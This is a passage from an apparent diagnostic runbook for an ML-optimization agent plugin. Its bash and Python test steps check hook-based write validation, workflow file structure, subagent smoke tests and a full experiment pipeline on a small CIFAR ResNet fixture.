  || echo "✗ L2 wrongly blocked diverged with notes"

# Frozen parameter violation → block
cat > $ENFORCE_EXP/experiments/optimization-goals.json << 'EOFGOALS'
{"constraints":{"frozen_parameters":["model_size","dataset"]}}
EOFGOALS
L2_OUT=$(l2_payload '{"exp_id":"exp-013","status":"completed","config":{"lr":0.01,"model_size":"large"},"metrics":{"loss":0.4},"iteration":1,"method_tier":"baseline","duration_seconds":60}' "$ENFORCE_EXP/experiments/results/round-1-hp/exp-013.json" | python3 $SCRIPTS/validate_experiment_write.py 2>/dev/null)
echo "$L2_OUT" | grep -q '"decision": *"block"' \
  && echo "$L2_OUT" | grep -q "frozen parameter 'model_size'" \
  && echo "✓ L2 blocks config that modifies frozen parameter" \
  || echo "✗ L2 FAILED to block frozen parameter violation"

# OOM batch size cap violation → block
cat > $ENFORCE_EXP/experiments/learned-behaviors.json << 'EOFBEH'
{"resource_constraints":[{"max_batch_size":128}]}
EOFBEH
L2_OUT=$(l2_payload '{"exp_id":"exp-014","status":"completed","config":{"batch_size":512},"metrics":{"loss":0.4},"iteration":1,"method_tier":"baseline","duration_seconds":60}' "$ENFORCE_EXP/experiments/results/round-1-hp/exp-014.json" | python3 $SCRIPTS/validate_experiment_write.py 2>/dev/null)
echo "$L2_OUT" | grep -q '"decision": *"block"' \
  && echo "$L2_OUT" | grep -q "batch_size=512 exceeds OOM limit 128" \
  && echo "✓ L2 blocks config that exceeds OOM batch_size cap" \
  || echo "✗ L2 FAILED to block OOM cap violation"

# Valid proposed-config → approve
mkdir -p $ENFORCE_EXP/experiments/proposed-configs/round-1-hp
L2_OUT=$(l2_payload '{"exp_id":"exp-015","config":{"lr":0.005,"batch_size":64},"method_tier":"method_tuned_hp","iteration":2,"code_branch":null,"gpu_id":0,"reasoning":"Lower lr based on prior results"}' "$ENFORCE_EXP/experiments/proposed-configs/round-1-hp/exp-015.json" | python3 $SCRIPTS/validate_experiment_write.py 2>/dev/null)
echo "$L2_OUT" | grep -q '"decision": *"approve"' \
  && echo "✓ L2 allows valid proposed-config in round subdir" \
  || echo "✗ L2 wrongly blocked valid proposed-config"

# Proposed-config exceeds OOM cap → block
L2_OUT=$(l2_payload '{"exp_id":"exp-016","config":{"lr":0.01,"batch_size":512},"method_tier":"method_tuned_hp","iteration":2,"code_branch":null,"gpu_id":0,"reasoning":"test"}' "$ENFORCE_EXP/experiments/proposed-configs/round-1-hp/exp-016.json" | python3 $SCRIPTS/validate_experiment_write.py 2>/dev/null)
echo "$L2_OUT" | grep -q '"decision": *"block"' \
  && echo "$L2_OUT" | grep -q "OOM limit" \
  && echo "✓ L2 blocks proposed-config that exceeds OOM cap (goal compliance on proposals)" \
  || echo "✗ L2 FAILED to enforce OOM cap on proposed-config"

# Cleanup goals/behaviors so they don't affect L3 tests below
rm -f $ENFORCE_EXP/experiments/optimization-goals.json $ENFORCE_EXP/experiments/learned-behaviors.json

# --- LAYER 3: SubagentStop output verification ---

# baseline-agent with both outputs → approve
mkdir -p $ENFORCE_EXP/experiments/logs/baseline
echo '{"exp_id":"baseline"}' > $ENFORCE_EXP/experiments/results/baseline.json
echo "log data" > $ENFORCE_EXP/experiments/logs/baseline/train.log
DECISION=$(echo '{"cwd":"'$ENFORCE_EXP'","subagent_type":"ml-optimizer:baseline-agent"}' \
  | python3 $SCRIPTS/validate_agent_output.py 2>/dev/null)
echo "$DECISION" | grep -q '"decision": *"approve"' \
  && echo "✓ L3 approves baseline-agent with both outputs" \
  || echo "✗ L3 FAILED to approve baseline-agent"

# baseline-agent with missing log → block
rm $ENFORCE_EXP/experiments/logs/baseline/train.log
DECISION=$(echo '{"cwd":"'$ENFORCE_EXP'","subagent_type":"ml-optimizer:baseline-agent"}' \
  | python3 $SCRIPTS/validate_agent_output.py 2>/dev/null)
echo "$DECISION" | grep -q '"decision": *"block"' \
  && echo "$DECISION" | grep -q "train.log" \
  && echo "✓ L3 blocks baseline-agent missing log" \
  || echo "✗ L3 FAILED to block missing log"

# analysis-agent with batch report (any_of) → approve
echo "# Batch 1" > $ENFORCE_EXP/experiments/reports/batch-1-analysis.md
DECISION=$(echo '{"cwd":"'$ENFORCE_EXP'","subagent_type":"ml-optimizer:analysis-agent"}' \
  | python3 $SCRIPTS/validate_agent_output.py 2>/dev/null)
echo "$DECISION" | grep -q '"decision": *"approve"' \
  && echo "✓ L3 approves analysis-agent via any_of (batch report)" \
  || echo "✗ L3 FAILED any_of batch"

# analysis-agent with session review only (any_of) → approve
rm $ENFORCE_EXP/experiments/reports/batch-1-analysis.md
echo "# Review" > $ENFORCE_EXP/experiments/reports/session-review.md
DECISION=$(echo '{"cwd":"'$ENFORCE_EXP'","subagent_type":"ml-optimizer:analysis-agent"}' \
  | python3 $SCRIPTS/validate_agent_output.py 2>/dev/null)
echo "$DECISION" | grep -q '"decision": *"approve"' \
  && echo "✓ L3 approves analysis-agent via any_of (session review)" \
  || echo "✗ L3 FAILED any_of session"

# analysis-agent with NEITHER output (any_of not satisfied) → block
rm $ENFORCE_EXP/experiments/reports/session-review.md
DECISION=$(echo '{"cwd":"'$ENFORCE_EXP'","subagent_type":"ml-optimizer:analysis-agent"}' \
  | python3 $SCRIPTS/validate_agent_output.py 2>/dev/null)
echo "$DECISION" | grep -q '"decision": *"block"' \
  && echo "✓ L3 blocks analysis-agent when any_of unsatisfied" \
  || echo "✗ L3 FAILED to block unsatisfied any_of"

# prerequisites-agent with prepared=false (required_if skipped) → approve
echo '{"status":"ready","dataset":{"prepared":false,"train_path":"/data"}}' > $ENFORCE_EXP/experiments/results/prerequisites.json
DECISION=$(echo '{"cwd":"'$ENFORCE_EXP'","subagent_type":"ml-optimizer:prerequisites-agent"}' \
  | python3 $SCRIPTS/validate_agent_output.py 2>/dev/null)
echo "$DECISION" | grep -q '"decision": *"approve"' \
  && echo "✓ L3 approves prerequisites-agent when prepared=false (required_if skipped)" \
  || echo "✗ L3 FAILED required_if false"

# prerequisites-agent with prepared=true but missing prepared-data/ → block
echo '{"status":"ready","dataset":{"prepared":true,"train_path":"/data"}}' > $ENFORCE_EXP/experiments/results/prerequisites.json
DECISION=$(echo '{"cwd":"'$ENFORCE_EXP'","subagent_type":"ml-optimizer:prerequisites-agent"}' \
  | python3 $SCRIPTS/validate_agent_output.py 2>/dev/null)
echo "$DECISION" | grep -q '"decision": *"block"' \
  && echo "$DECISION" | grep -q "prepared-data" \
  && echo "✓ L3 blocks prerequisites-agent when prepared=true but dir missing (required_if true)" \
  || echo "✗ L3 FAILED required_if true"

# prerequisites-agent with prepared=true AND prepared-data/ exists → approve
mkdir -p $ENFORCE_EXP/experiments/prepared-data
DECISION=$(echo '{"cwd":"'$ENFORCE_EXP'","subagent_type":"ml-optimizer:prerequisites-agent"}' \
  | python3 $SCRIPTS/validate_agent_output.py 2>/dev/null)
echo "$DECISION" | grep -q '"decision": *"approve"' \
  && echo "✓ L3 approves prerequisites-agent when prepared=true AND dir exists" \
  || echo "✗ L3 FAILED required_if true+dir"


# Cleanup
rm -rf $ENFORCE_EXP
```

Report pass/fail count. Expected: 22 ✓ lines (3 for L1, 11 for L2, 8 for L3).

## Step 4: Workflow infrastructure validation

Validate that the dynamic workflows backing phases 5–8 are present and well-formed, and that the phase docs dispatch through them. Structural validation — no live agent dispatch needed.

### 4.1: Workflow files exist and are valid

Checks (each prints ✓/✗; all run regardless of individual failures):

```bash
PLUGIN_ROOT="${CLAUDE_PLUGIN_ROOT}"
export PLUGIN_ROOT
SCRIPTS="$PLUGIN_ROOT/scripts"
HOOKS="$PLUGIN_ROOT/hooks"
FIX="$PLUGIN_ROOT/tests/fixtures"

# ── 4.1: Workflow files exist and are valid ──
cd $PLUGIN_ROOT
WORKFLOWS="$PLUGIN_ROOT/skills/orchestrate/workflows"

# Detect node once — node --check is skipped if absent
HAVE_NODE=0; which node > /dev/null 2>&1 && HAVE_NODE=1

for f in phase-5-research.js phase-6-implement.js phase-7-experiment.js phase-8-stacking.js; do
  path="$WORKFLOWS/$f"
  if [ ! -f "$path" ]; then
    echo "FAIL: $f missing"
    continue
  fi
  # Must begin with 'export const meta'
  if head -1 "$path" | grep -q "export const meta"; then
    META_OK="meta✓"
  else
    META_OK="meta✗"
  fi
  # node --check (skip if node absent)
  if [ "$HAVE_NODE" -eq 1 ]; then
    if node --check "$path" 2>/dev/null; then
      CHECK_OK="node-check✓"
    else
      CHECK_OK="node-check✗"
    fi
  else
    CHECK_OK="node-check(skipped — node absent)"
  fi
  echo "PASS: $f present — $META_OK $CHECK_OK"
done

# ── 4.2: Phase docs dispatch via Workflow( ──
REFS="$PLUGIN_ROOT/skills/orchestrate/references"
for doc in phase-5-research phase-6-implement phase-7-experiment-loop phase-8-stacking; do
  path="$REFS/$doc.md"
  if [ -f "$path" ] && grep -q "Workflow(" "$path"; then
    echo "PASS: $doc.md dispatches via Workflow("
  else
    echo "FAIL: $doc.md does NOT dispatch via Workflow("
  fi
done

# ── 4.3: pipeline_state save/load roundtrips user_choices (no agent_registry) ──
python3 -c "
import sys, tempfile
sys.path.insert(0, '$PLUGIN_ROOT/scripts')
from pipeline_state import save_state, load_state
with tempfile.TemporaryDirectory() as d:
    # Test user_choices save/load roundtrip
    choices = {'primary_metric': 'loss', 'lower_is_better': True}
    save_state(7, 1, [], d, user_choices=choices)
    state = load_state(d)
    assert state['user_choices'] == choices, 'user_choices roundtrip failed'
    # Test preserve-on-None
    save_state(7, 2, [], d)
    assert load_state(d)['user_choices'] == choices, 'user_choices not preserved'
    # No agent_registry should be persisted
    assert 'agent_registry' not in load_state(d), 'agent_registry should be removed'
print('pipeline_state: user_choices roundtrip OK, no agent_registry')
"
```

Report results in a summary table:
```
Workflow Infrastructure:
  Workflow files present:          [✓/✗] — phase-{5,6,7,8}-*.js exist
  export const meta header:        [✓/✗] — 4/4 begin with 'export const meta'
  node --check passes:             [✓/✗/skipped] — 4/4 parse (skipped if node absent)
  Phase docs use Workflow():       [✓/✗] — 4/4 phase-5/6/7/8 docs dispatch via Workflow()
  pipeline_state user_choices:     [✓/✗] — save/load/preserve, no agent_registry
```

## Step 5: Agent dispatch smoke tests

Dispatch each of the 9 agents with a minimal smoke-test prompt. Run them in 2 batches for speed.

**Batch 1 — Procedural agents (model: sonnet[1m]):**

For each, dispatch with: "This is a smoke test. List your tools and confirm you can see your preloaded skill. Confirm you have persistent agent memory (memory: local). Respond in 2-3 sentences."

1. `ml-optimizer:prerequisites-agent`
2. `ml-optimizer:baseline-agent`
3. `ml-optimizer:experiment-agent`
4. `ml-optimizer:monitor-agent`

**Batch 2 — Analytical agents (model: opus[1m]):**

1. `ml-optimizer:research-agent`
2. `ml-optimizer:implement-agent`
3. `ml-optimizer:tuning-agent`
4. `ml-optimizer:analysis-agent`
5. `ml-optimizer:report-agent`

For each agent, verify:

- Agent resolves (no "not found" error)
- Agent lists its declared tools
- Agent confirms it can see its preloaded skill(s)
- **implement-agent**: Confirm it can see `feature-dev:code-explorer` and `feature-dev:code-reviewer` in addition to `ml-optimizer:implement` and `superpowers:systematic-debugging`
- **research-agent**: Confirm it can see `claude-mem:mem-search` (or reports it unavailable gracefully)

**Special case — implement-agent:** Use this prompt instead: "This is a smoke test. List your tools. Confirm you can see these skills: ml-optimizer:implement, ml-optimizer:evolve, ml-optimizer:shinka-setup, ml-optimizer:shinka-convert, ml-optimizer:shinka-run, ml-optimizer:shinka-inspect. Confirm persistent agent memory. Respond in 2-3 sentences."

Report results in a table.

## Step 6: Full pipeline (Agent dispatch + dynamic workflows)

Core diagnostic — the runner drives the full optimization flow end to end, exactly as the orchestrator does. Phases 0/1, 2, 3, 4, 9 dispatch via `Agent()` (interactive/trivial, correctly direct-dispatch per the architecture); phases 5, 6, 7, 8 launch the bundled dynamic workflows via `Workflow({scriptPath: "${CLAUDE_PLUGIN_ROOT}/skills/orchestrate/workflows/phase-N-<name>.js", args})` — the workflow script owns that phase's fan-out/loop and dispatches its agents internally via `agentType`. The runner reads each workflow's structured return plus the files it wrote under `<exp_root>/`, and runs the user checkpoint between phases. This exercises the ACTUAL workflow scripts (Step 4 only node-checks them). Tests the full optimization flow including all autoresearch-inspired features and goal memory.

**Error handling:** After each phase, verify expected outputs exist. If a phase fails, log it FAILED, skip to Step 6.8 (feature checklist) with partial results, and include the failure in the final report.

### 6.1: Set up test project

```bash
rm -rf /tmp/ml-opt-diagnostic
cp -r $FIX/tiny_resnet_cifar10/ /tmp/ml-opt-diagnostic/
cd /tmp/ml-opt-diagnostic
# gitignore experiments/ BEFORE the first commit — Step 6.6c creates method branches
# with `git add -A`, which would otherwise sweep the untracked run artifacts into a
# branch and let a later `git checkout` wipe them from the working tree.
echo "experiments/" > .gitignore
git init && git add . && git commit -m "initial"
mkdir -p /tmp/ml-opt-diagnostic/experiments/{results,reports,logs,scripts,artifacts}

# Breadcrumb (normally written at Phase 0 — phase-0-discovery.md Step 3.1). Required so
# the L2 PreToolUse hook can resolve exp_root and actually enforce during Step 6, not
# just Step 3.2's synthetic tests.
mkdir -p /tmp/ml-opt-diagnostic/.claude
python3 -c "
import json
from pathlib import Path
bc = Path('/tmp/ml-opt-diagnostic/.claude/ml-optimizer.json')
json.dump({'active': '/tmp/ml-opt-diagnostic/experiments', 'runs': ['/tmp/ml-opt-diagnostic/experiments']}, bc.open('w'), indent=2)
"
```

Use these paths throughout the diagnostic:

- Project root: `/tmp/ml-opt-diagnostic`
- Experiment root: `/tmp/ml-opt-diagnostic/experiments`

### 6.2: Phase 2 — Prerequisites

Dispatch the prerequisites agent:

```text
Agent(
  description: "Diagnostic: check prerequisites",
  prompt: "Check prerequisites for ML project. Parameters: project_root: /tmp/ml-opt-diagnostic, framework: pytorch, training_script: train.py, config_path: config.yaml, train_data_path: embedded_in_code, val_data_path: embedded_in_code, env_manager: conda, env_name: base, exp_root: /tmp/ml-opt-diagnostic/experiments. After completing, update your agent memory with environment detection patterns and dataset configuration for this project.",
  subagent_type: "ml-optimizer:prerequisites-agent"
)
```

**Verify:** Read `experiments/results/prerequisites.json`. Confirm `ready_for_baseline` is true. If not, log Phase 2 as FAILED.

**Schema validation:**

```bash
python3 $SCRIPTS/schema_validator.py \
  /tmp/ml-opt-diagnostic/experiments/results/prerequisites.json prerequisites
```

Confirm output shows `"valid": true`.

**Goal memory: init goals** (simulates Phase 0 output):

```bash
python3 $SCRIPTS/goal_memory.py \
  /tmp/ml-opt-diagnostic/experiments init-goals \
  '{"objective":{"primary_metric":"accuracy","lower_is_better":false,"target_value":90.0,"problem_description":"Diagnostic test"},"constraints":{"scope_level":"training","model_category":"supervised","frozen_parameters":[],"fixed_time_budget":30,"fixed_epoch_budget":null},"divergence":{"metric":"loss","lower_is_better":true}}'
```

**Verify:** `experiments/optimization-goals.json` exists.

### 6.3: Phase 3 — Baseline

Dispatch the baseline agent:

```text
Agent(
  description: "Diagnostic: establish baseline",
  prompt: "Establish baseline metrics. Parameters: project_root: /tmp/ml-opt-diagnostic, train_command: python train.py --epochs 2, eval_command: python eval.py, model_category: supervised, exp_root: /tmp/ml-opt-diagnostic/experiments. After completing, update your agent memory with profiling patterns, training command adjustments, and GPU usage observations for this project.",
  subagent_type: "ml-optimizer:baseline-agent"
)
```

**Verify:** Read `experiments/results/baseline.json`. Confirm it has `metrics` and `config` keys.

**Schema validation:**

```bash
python3 $SCRIPTS/schema_validator.py \
  /tmp/ml-opt-diagnostic/experiments/results/baseline.json baseline
```

Confirm output shows `"valid": true`.

**Store baseline checksum** (immutable baseline feature):

```bash
python3 -c "
import sys, json
sys.path.insert(0, '$SCRIPTS')
from pipeline_state import save_state, _compute_baseline_checksum
baseline = json.loads(open('/tmp/ml-opt-diagnostic/experiments/results/baseline.json').read())
checksum = _compute_baseline_checksum(baseline['metrics'])
save_state(3, 0, [], '/tmp/ml-opt-diagnostic/experiments', baseline_checksum=checksum, user_choices={
  'primary_metric': 'loss', 'lower_is_better': True, 'fixed_time_budget': 30, 'fixed_epoch_budget': None
})
print(f'Baseline checksum stored: {checksum[:16]}...')
"
```

**Verify baseline integrity:**

```bash
python3 $SCRIPTS/pipeline_state.py /tmp/ml-opt-diagnostic/experiments verify-baseline
```

If exit code is non-zero, log Phase 3 as FAILED.

### 6.4: Phase 5 — Research (dynamic workflow)

Phase 5 launches the **actual** research workflow. The workflow fans research-agent out across domain angles, dedups + adversarially vets candidates, writes `reports/research-findings.md`, and initializes the research agenda — internally handling the web / knowledge / HP-only source fallback, so the former three source-mode dispatches collapse into one launch (no manual per-mode dispatch).

**Launch the Phase 5 workflow** (args contract verified from `phase-5-research.js`):

```text
Workflow({
  scriptPath: "${CLAUDE_PLUGIN_ROOT}/skills/orchestrate/workflows/phase-5-research.js",
  args: {
    exp_root: "/tmp/ml-opt-diagnostic/experiments",
    primary_metric: "loss",
    model_category: "supervised",
    scope_level: "training",
    source: "web",
    user_papers: null
  }
})
```

Returns `{findings_path, proposals[], agenda_initialized}` — capture it; Phase 6 consumes `findings_path` and the returned proposal indices.

> CIFAR offline note: candidate training in Phases 7–8 must load CIFAR offline (the fixture's CIFAR host is throttled) — ensure the persisted `train_command` in `user_choices` carries `--data_dir <cached cifar>` before those workflows run.

**Verify:** `experiments/reports/research-findings.md` exists with at least 1 proposal, and the return's `proposals[]` is non-empty.

**alphaxiv-or-fallback note:**

```bash
python3 -c "
content = open('/tmp/ml-opt-diagnostic/experiments/reports/research-findings.md').read()
has_arxiv = 'arxiv' in content.lower()
print(f'alphaxiv MCP: {\"active (arxiv refs found)\" if has_arxiv else \"fallback to WebSearch only\"}')"
```

#### Research agenda (initialized by the workflow)

The workflow dedups across its research angles internally and initializes `research-agenda.json` from the vetted proposals (returning `agenda_initialized: true`). Confirm it, and self-heal from `research-findings.md` if the return reports it was not initialized:

```bash
python3 -c "
import sys, json, os, subprocess
sys.path.insert(0, os.path.expanduser('$SCRIPTS'))
agenda_path = '/tmp/ml-opt-diagnostic/experiments/reports/research-agenda.json'
if not os.path.exists(agenda_path):
    from implement_utils import parse_research_proposals
    proposals = parse_research_proposals('/tmp/ml-opt-diagnostic/experiments/reports/research-findings.md')
    ideas = json.dumps([{'id': f'idea-{i+1}', 'technique': p.get('name', 'unknown'), 'priority': 5, 'status': 'untried', 'source': 'research'} for i, p in enumerate(proposals)])
    subprocess.run([
        'python3', f'{os.environ["SCRIPTS"]}/error_tracker.py',
        '/tmp/ml-opt-diagnostic/experiments', 'agenda', 'init', ideas
    ], check=True)
    print('Research agenda initialized from proposals')
else:
    print('Research agenda already exists')
"
```

**Verify:** the workflow return's `agenda_initialized` is true and `python3 $SCRIPTS/error_tracker.py /tmp/ml-opt-diagnostic/experiments agenda list` returns a non-empty list.

### 6.5: Phase 6 — Implement (dynamic workflow)

**Before launching:** Use the Phase 5 return — `findings_path` (`research-findings.md`) and the proposal indices from `proposals[]`. Phase 6 launches the **actual** implement workflow, which dispatches implement-agent per proposal (one worktree-isolated `ml-opt/<slug>` branch each, in parallel), runs the code-reviewer + silent-failure-hunter reviewers internally, and assembles `results/implementation-manifest.json`.

**Launch the Phase 6 workflow** (args contract verified from `phase-6-implement.js`):

```text
Workflow({
  scriptPath: "${CLAUDE_PLUGIN_ROOT}/skills/orchestrate/workflows/phase-6-implement.js",
  args: {
    exp_root: "/tmp/ml-opt-diagnostic/experiments",
    project_root: "/tmp/ml-opt-diagnostic",
    findings_path: "/tmp/ml-opt-diagnostic/experiments/reports/research-findings.md",
    selected_indices: [1],
    strategy: "git_branch"
  }
})
```

Returns `{manifest_path, branches[]}` — `branches[]` carries `{slug, branch, status, validation, reviews}` per proposal.

> CIFAR offline note: the branches this workflow produces are trained in Phases 7–8 — the persisted `train_command` must carry `--data_dir <cached cifar>` so candidate training loads CIFAR offline (throttled host).

**Verify:**

- `experiments/results/implementation-manifest.json` exists with `proposals` array
- At least one proposal has `status: "validated"` (equivalently, some `branches[].status == "validated"` in the return)
- Git branches exist: run `git -C /tmp/ml-opt-diagnostic branch --list "ml-opt/*"`

**Schema validation:**

```bash
python3 $SCRIPTS/schema_validator.py \
  /tmp/ml-opt-diagnostic/experiments/results/implementation-manifest.json manifest
```

Confirm output shows `"valid": true`.

### 6.6: Phase 7 — Experiment Loop (dynamic workflow)

**Before launching:** Read `experiments/results/baseline.json` (the workflow's `baseline` arg is its parsed contents) and confirm the validated branches from the Phase 6 return / `implementation-manifest.json`. Phase 7 launches ONE **actual** experiment workflow that owns the entire autonomous loop internally: per round it dispatches tuning-agent (propose HP configs) → experiment-agents (parallel, worktree-isolated) → per-run divergence handling (the monitor role) → analysis-agent (writes `batch-N-analysis.md`, returns a decision), then acts on the decision tree (continue / branch_test / hp_expand / narrow_space / regularization / method_proposal / code_evolution / stop), including the code_evolution chain (tuning evolve-HPs → implement evolve skill → experiment on the evolved branch) and the stuck-protocol + fixpoint exit. There is no manual per-agent dispatch here — the workflow does it all.

**Launch the Phase 7 workflow** (args contract verified from `phase-7-experiment-loop.md` + `phase-7-experiment.js`):

```text
Workflow({
  scriptPath: "${CLAUDE_PLUGIN_ROOT}/skills/orchestrate/workflows/phase-7-experiment.js",
  args: {
    exp_root: "/tmp/ml-opt-diagnostic/experiments",
    project_root: "/tmp/ml-opt-diagnostic",
    baseline: <parsed contents of experiments/results/baseline.json>,
    primary_metric: "loss",
    divergence_metric: "loss",
    divergence_lower_is_better: true,
    model_category: "supervised",
    lower_is_better: true,
    target_value: null,
    scope_level: "full",
    fixed_time_budget: 30,
    fixed_epoch_budget: null,
    fixed_step_budget: null,
    hp_batches_per_round: 3,
    method_proposal_scope: "architecture",
    method_proposal_iterations: 1,
    experiments_per_gpu: 1,
    secondary_metrics: [],
    seeds_per_config: 1,
    budget: null
  }
})
```

`scope_level: "full"` plus `method_proposal_scope`/`method_proposal_iterations` are set so the loop can exercise the method_proposal AND code_evolution pivots (their outputs are checked post-hoc below). Returns `{best_exp_id, best_metric, rounds_completed, exit_reason, stacking_candidates[]}` — capture `stacking_candidates[]`; Phase 8 launches only when it is non-empty.

> CIFAR offline note: the workflow's experiment-agents read the persisted `train_command` from `user_choices` — it MUST carry `--data_dir <cached cifar>` (e.g. `train_command: python train.py --epochs 2 --data_dir <cached cifar>`) so candidate training loads CIFAR offline (throttled host).

#### Post-loop verification (reading the workflow's outputs)

After the workflow returns, verify the outputs it wrote under `<exp_root>/` (no separate manual dispatches):

**Placeholder result & metadata verification:**

```bash
python3 -c "
import json, glob
results = glob.glob('/tmp/ml-opt-diagnostic/experiments/results/round-*/exp-*.json')
issues = []
for f in results:
    data = json.loads(open(f).read())
    eid = data.get('exp_id', '?')
    if data.get('status') == 'running':
        issues.append(f'{eid}: still running (placeholder not overwritten)')
    for field in ['method_tier', 'iteration']:
        if field not in data:
            issues.append(f'{eid}: missing {field}')
if issues:
    print('✗ Result metadata: ' + '; '.join(issues))
else:
    print(f'✓ Result metadata: all {len(results)} results have required fields')
"
```

**Schema validation on all results:**

```bash
for f in /tmp/ml-opt-diagnostic/experiments/results/round-*/exp-*.json; do
  python3 $SCRIPTS/schema_validator.py "$f" result --strict 2>/dev/null
done
```

**Worktree cleanup verification:**

```bash
python3 -c "
from pathlib import Path
wt = Path('/tmp/ml-opt-diagnostic/experiments/worktrees')
if wt.exists() and list(wt.iterdir()):
    print('✗ Worktree cleanup: leftover worktrees found')
else:
    print('✓ Worktree cleanup: clean')
"
```

#### Analysis (owned by the workflow)

The analysis-agent runs INSIDE the loop each batch — it writes `reports/batch-N-analysis.md` and returns the decision the workflow acts on. There is no manual analyze dispatch here; verify its outputs instead.

**Verify after the loop:**

- `experiments/results/round-*/exp-*.json` files exist with experiment results
- At least one `experiments/reports/batch-*-analysis.md` exists (the loop writes one per batch)
- Research agenda updated: `python3 $SCRIPTS/error_tracker.py /tmp/ml-opt-diagnostic/experiments agenda list`
- Baseline integrity still valid: `python3 $SCRIPTS/pipeline_state.py /tmp/ml-opt-diagnostic/experiments verify-baseline`
- Goal memory sync and summary: `python3 $SCRIPTS/goal_memory.py /tmp/ml-opt-diagnostic/experiments sync-from-errors && python3 $SCRIPTS/goal_memory.py /tmp/ml-opt-diagnostic/experiments summary`
- Regenerate live dashboard: `python3 $SCRIPTS/dashboard.py /tmp/ml-opt-diagnostic/experiments --live`

**Result analyzer CLI check:**

```bash
python3 $SCRIPTS/result_analyzer.py \
  /tmp/ml-opt-diagnostic/experiments/results loss baseline true
```

Verify the output includes ranking information.

#### Phase 7 code_evolution (exercised inside the workflow)

The Phase 7 loop owns the code evolution chain: when analysis returns `code_evolution` (only at `scope_level: "full"`), the workflow dispatches tuning-agent (evolve HPs) → implement-agent with the evolve skill (shinka-convert → shinka-run → shinka-inspect) → experiment on the evolved branch, all internally. There is no manual evolve dispatch here — verify post-hoc whether the loop exercised it (report SKIPPED if analysis never pivoted to code_evolution or ShinkaEvolve is unavailable).

**Verify Phase 7 evolve chain:**

```bash
python3 -c "
import subprocess, json, sys, os, glob

# Check evolved branch exists
r = subprocess.run(['git', '-C', '/tmp/ml-opt-diagnostic', 'branch', '--list', 'ml-opt/*evolved*'],
                   capture_output=True, text=True)
branches = [b.strip() for b in r.stdout.strip().split('\n') if b.strip()]
if branches:
    print(f'✓ Evolved branch created: {branches[0]}')
else:
    print('— No evolved branch (ShinkaEvolve may be unavailable)')

# Check experiment result on evolved branch
EXP = '/tmp/ml-opt-diagnostic/experiments'
evolved_results = [f for f in glob.glob(f'{EXP}/results/round-*-evolved/exp-*.json')]
if evolved_results:
    print(f'✓ Experiment on evolved code: {len(evolved_results)} results')
else:
    print('— No experiment results on evolved code')
"
```

```
Phase 7 Evolve (Orchestrator-Driven):
  1. Evolve HPs tuned:    [passed/failed/skipped]
  2. ShinkaEvolve ran:     [passed/failed/skipped]
  3. Evolved branch:       [passed/failed/skipped]
  4. HP tuning evolved:    [passed/failed/skipped]
  5. Experiment evolved:   [passed/failed/skipped]
  If ShinkaEvolve unavailable: log as SKIPPED
```

#### Post-loop feature checks: OOM feedback + divergence detection

The loop runs multiple iterations internally, so there is no manual "iteration 2". These CLI/python checks confirm the error-recovery machinery the loop relies on works — the OOM feedback loop and the all-diverge pattern detection — without any manual experiment dispatch.

**OOM feedback trigger:** Log OOM events from iteration 1 results, then sync to behavioral memory:

```bash
python3 -c "
import sys, os, json
sys.path.insert(0, os.path.expanduser('$SCRIPTS'))
from error_tracker import create_event, log_event
from goal_memory import sync_from_errors, validate_agent_output

# Log 2 OOM events (simulates batch_size too large for this model)
for i in range(2):
    ev = create_event('training_failure', 'warning', 'experiment',
                       'CUDA out of memory at batch_size=256',
                       config={'batch_size': 256, 'lr': 0.01}, exp_id=f'exp-oom-{i}')
    log_event('/tmp/ml-opt-diagnostic/experiments', ev)

# Sync OOM events into behavioral memory
sync_from_errors('/tmp/ml-opt-diagnostic/experiments')

# Verify: config with batch_size=512 should be rejected
val = validate_agent_output('/tmp/ml-opt-diagnostic/experiments', 'hp-tune', {
    'configs': [{'lr': 0.001, 'batch_size': 512}]
})
if not val['valid'] and any('OOM' in v for v in val['violations']):
    print('✓ OOM feedback loop: oversized batch rejected by validation')
else:
    print('✗ OOM feedback loop: validation did not catch OOM violation')
"
```

**Divergence detection:** Inside the loop the experiment-agents run `detect_divergence.py` per run and mark extreme-LR runs `diverged`. This check confirms the all-diverge cluster pattern fires on clustered divergence events, independent of a live run:

**Verify divergence detection:**

```bash
python3 -c "
import sys, os, json
sys.path.insert(0, os.path.expanduser('$SCRIPTS'))
from error_tracker import get_events, detect_patterns

# Log divergence events for the extreme-LR experiments.
# NOTE: high_lr_divergence fires on 2+ divergence events (error_tracker.detect_patterns),
# so log two — a single event will not trigger the cluster pattern.
from error_tracker import create_event, log_event
for lr in [100.0, 50.0]:
    ev = create_event('divergence', 'warning', 'monitor',
                       f'NaN detected at lr={lr}', config={'lr': lr, 'batch_size': 32})
    log_event('/tmp/ml-opt-diagnostic/experiments', ev)

events = get_events('/tmp/ml-opt-diagnostic/experiments')
patterns = detect_patterns(events)
diverge = [p for p in patterns if p['pattern_id'] == 'high_lr_divergence']
if diverge:
    print(f'✓ All-diverge detection: {diverge[0][\"description\"]}')
else:
    print('✗ All-diverge detection: high_lr_divergence pattern not found')
"
```

#### Stuck Protocol Trigger

After iteration 2, verify the stop signal persists and the stuck protocol data is readable. The orchestrator makes an evidence-based judgment to continue or exit (no fixed stop-count threshold). `consecutive_stop_count` must persist, and the stuck protocol data (error patterns, dead-ends, research agenda) must be available for the orchestrator to dispatch research for fresh ideas and weigh whether the search is exhausted.

```bash
python3 -c "
import sys, os, json, subprocess
sys.path.insert(0, os.path.expanduser('$SCRIPTS'))
SCRIPTS = os.path.expanduser('$SCRIPTS')
EXP = '/tmp/ml-opt-diagnostic/experiments'

from pipeline_state import save_state, load_state
state = load_state(EXP) or {}
save_state(
    phase=state.get('phase', 7),
    iteration=state.get('iteration', 2),
    running_exp_ids=[],
    exp_root=EXP,
    consecutive_stop_count=2,
    stuck_protocol_triggered=False
)
state = load_state(EXP)
# consecutive_stop_count is a persisted SIGNAL the orchestrator weighs — not a hard threshold
signal_ok = state.get('consecutive_stop_count') == 2 and 'stuck_protocol_triggered' in state
print('✓ Stuck protocol: stop signal persisted for orchestrator judgment') if signal_ok else print('✗ Stuck protocol: signal persistence failed')

# Verify the data stuck protocol reads is available
r1 = subprocess.run(['python3', f'{SCRIPTS}/error_tracker.py', EXP, 'patterns'], capture_output=True, text=True)
r2 = subprocess.run(['python3', f'{SCRIPTS}/error_tracker.py', EXP, 'dead-end', 'list'], capture_output=True, text=True)
r3 = subprocess.run(['python3', f'{SCRIPTS}/error_tracker.py', EXP, 'agenda', 'list'], capture_output=True, text=True)
all_ok = r1.returncode == 0 and r2.returncode == 0 and r3.returncode == 0
